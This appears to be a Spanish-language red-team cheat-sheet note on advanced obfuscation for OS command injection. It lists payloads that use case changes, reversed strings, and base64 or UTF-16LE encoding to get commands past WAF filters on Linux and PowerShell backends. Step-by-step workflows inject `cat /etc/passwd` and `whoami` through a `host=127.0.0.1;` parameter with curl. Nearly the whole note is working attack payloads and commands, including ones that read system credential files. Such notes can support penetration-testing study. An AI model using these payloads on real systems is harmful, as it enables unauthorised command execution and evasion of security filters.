---
aliases:
tags:
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[OS Command Injection]]"
  - "[[Generación de Base64 para Windows (desde Linux)]]"
---
# Command Injection - Ofuscación Avanzada

---

## Case Manipulation

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `WhOaMi` | Windows ejecuta nativamente (case-insensitive) | Backend Windows (CMD/PS). Filtro busca `whoami` literal. |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Linux normaliza mixed-case con `tr` → `whoami` | Backend Linux. Combinar con bypass de espacios. |
| `a="WhOaMi";printf %s "${a,,}"` | Bash 4+ — `${var,,}` lowercase expansion | Bash moderno, sintaxis limpia sin sub-shell. |
| `$(echo WhOaMi \| awk '{print tolower($0)}')` | Alternativa con `awk` | `tr` filtrado. |
^ci-avanzado-mayusculas

---

## Reversed Commands

Genera el comando al revés para que el WAF no reconozca la firma.

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `$(rev<<<'imaohw')` | Linux — invierte string `imaohw` → `whoami` y ejecuta | Filtro busca `whoami` exacto. Linux con `rev` disponible. |
| `echo 'whoami' \| rev` | **Preparación local** — invierte el cmd para construir payload | En tu máquina, antes de inyectar. |
| `iex "$('imaohw'[-1..-20] -join '')"` | Windows PS — array slice negativo invierte | Backend PowerShell. `-20` debe ser ≥ largo del cmd. |
| `"whoami"[-1..-20] -join ''` | **Preparación local** — invierte el cmd en PS | En tu máquina con `pwsh` o Windows PS. |
^ci-avanzado-comandos-invertidos

---

## Encoded Commands (Base64)

La técnica más robusta — encapsula chars prohibidos dentro de string base64.

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Linux — decode base64 + ejecuta `cat /etc/passwd \| grep 33` | Filtro bloquea `\|`/`/`/`cat`. Base64 evade todo. |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Windows PS — decode UTF-16LE base64 + ejecuta `whoami` | Backend PowerShell. UTF-16LE obligatorio. |
| `powershell -enc <BASE64>` | Windows PS — flag `-enc` decodifica directo | Cuando podés invocar `powershell` con flags. |
| `echo -n 'cat /etc/passwd' \| base64` | **Preparación Linux** — codifica payload | En tu máquina. UTF-8 default. |
| `echo -n 'whoami' \| iconv -f utf-8 -t utf-16le \| base64` | **Preparación Windows** — UTF-16LE base64 desde Linux | Windows PS requiere UTF-16LE, no UTF-8. |
^ci-avanzado-comandos-codificados

### Workflow completo Linux

```bash
# 1. Preparar
CMD='cat /etc/passwd | grep 33'
B64=$(echo -n "$CMD" | base64)
echo "$B64"  # Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# 2. Construir payload
PAYLOAD="bash<<<\$(base64 -d<<<$B64)"

# 3. Inyectar (URL-encode si va por GET)
curl "https://target/?host=127.0.0.1;$PAYLOAD"
```

### Workflow completo Windows

```bash
# 1. Preparar — UTF-16LE base64
CMD='whoami'
B64=$(echo -n "$CMD" | iconv -f utf-8 -t utf-16le | base64)
echo "$B64"  # dwBoAG8AYQBtAGkA

# 2. Opción simple — con flag -enc
PAYLOAD="powershell -enc $B64"

# 3. Opción inline (cuando no podés flags)
PAYLOAD="iex \"\$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$B64')))\""
```

---
